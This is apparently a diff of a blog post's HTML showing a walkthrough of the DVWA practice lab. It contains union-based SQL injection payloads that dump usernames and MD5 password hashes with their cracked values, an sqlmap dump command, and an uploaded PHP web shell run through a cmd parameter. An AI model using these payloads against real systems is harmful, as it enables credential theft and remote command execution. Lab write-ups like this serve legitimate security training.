-</pre></td><td class='code'><pre><code class=''><span class='line'>ID: &rsquo; union select user, password from users&ndash; -
-</span><span class='line'>First name: admin
-</span><span class='line'>Surname: 098f6bcd4621d373cade4e832627b4f6&lt;/p&gt;&lt;/blockquote&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
-</span><span class='line'>First name: gordonb
-</span><span class='line'>Surname: e99a18c428cb38d5f260853678922e03&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
-</span><span class='line'>First name: 1337
-</span><span class='line'>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
-</span><span class='line'>First name: pablo
-</span><span class='line'>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
-</span><span class='line'>First name: smithy
-</span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99
-</span><span class='line'>&lt;code&gt;``
-</span><span class='line'>Looks like passwords are MD5 hashed. However, they are easily found to be&lt;/code&gt;test&lt;code&gt;,&lt;/code&gt;abc123&lt;code&gt;,&lt;/code&gt;charley&lt;code&gt;,&lt;/code&gt;letmein&lt;code&gt;and&lt;/code&gt;password` respectively.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;SQL Injection(Blind)&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
-</span><span class='line'>We can use &lt;code&gt;sqlmap&lt;/code&gt; to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)</span></code></pre></td></tr></table></div></figure>
-sqlmap -u &ldquo;<a href="http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#">http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#</a>&rdquo; &ndash;cookie=&ldquo;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&rdquo; &ndash;dump</p>
+<pre><code>ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
+First name: guestbook
+Surname: 
 
-<pre><code></code></pre>
+ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
+First name: users
+Surname: 
+</code></pre>
 
-<p>Database: dvwa
+<blockquote><p>&lsquo; union select column_name,null from information_schema.columns where table_name=&#8217;users&rsquo;&ndash; -</p></blockquote>
+
+<pre><code>ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: user_id
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: first_name
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: last_name
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: user
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: password
+Surname: 
+
+ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
+First name: avatar
+Surname: 
+</code></pre>
+
+<blockquote><p>&lsquo; union select user, password from users&ndash; -</p></blockquote>
+
+<pre><code>ID: ' union select user, password from users-- -
+First name: admin
+Surname: 098f6bcd4621d373cade4e832627b4f6
+
+ID: ' union select user, password from users-- -
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: ' union select user, password from users-- -
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: ' union select user, password from users-- -
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: ' union select user, password from users-- -
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+
+<p>Looks like the passwords are MD5 hashed. However, they are easily found to be <code>test</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code> and <code>password</code> respectively.</p>
+
+<h2>SQL Injection(Blind)</h2>
+
+<p>The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
+We can use <code>sqlmap</code> to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)</p>
+
+<pre><code>sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28" --dump
+</code></pre>
+
+<pre><code>Database: dvwa
 Table: users
 [5 entries]
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
 | user_id | user    | avatar                                                | password                         | last_name | first_name |
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
-| 1       | admin   | <a href="http://192.168.52.129/dvwa/hackable/users/admin.jpg">http://192.168.52.129/dvwa/hackable/users/admin.jpg</a>   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
-| 2       | gordonb | <a href="http://192.168.52.129/dvwa/hackable/users/gordonb.jpg">http://192.168.52.129/dvwa/hackable/users/gordonb.jpg</a> | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
-| 3       | 1337    | <a href="http://192.168.52.129/dvwa/hackable/users/1337.jpg">http://192.168.52.129/dvwa/hackable/users/1337.jpg</a>    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
-| 4       | pablo   | <a href="http://192.168.52.129/dvwa/hackable/users/pablo.jpg">http://192.168.52.129/dvwa/hackable/users/pablo.jpg</a>   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
-| 5       | smithy  | <a href="http://192.168.52.129/dvwa/hackable/users/smithy.jpg">http://192.168.52.129/dvwa/hackable/users/smithy.jpg</a>  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
-+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
-&#8220;`</p>
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
+| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
+| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
+| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
+| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+</code></pre>
 
 <h2>Upload</h2>
 
@@ -679,14 +518,15 @@ Table: users
 </span><span class='line'>    <span class="k">die</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-<code>
-../../hackable/uploads/shell.php succesfully uploaded!
-</code>
-We can execute commands now via this shell:
-<code>
-http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al
-</code></p>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<pre><code>../../hackable/uploads/shell.php succesfully uploaded!
+</code></pre>
+
+<p>We can execute commands now via this shell:</p>
+
+<pre><code>http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al
+</code></pre>
 
 <h2>XSS reflected</h2>
 
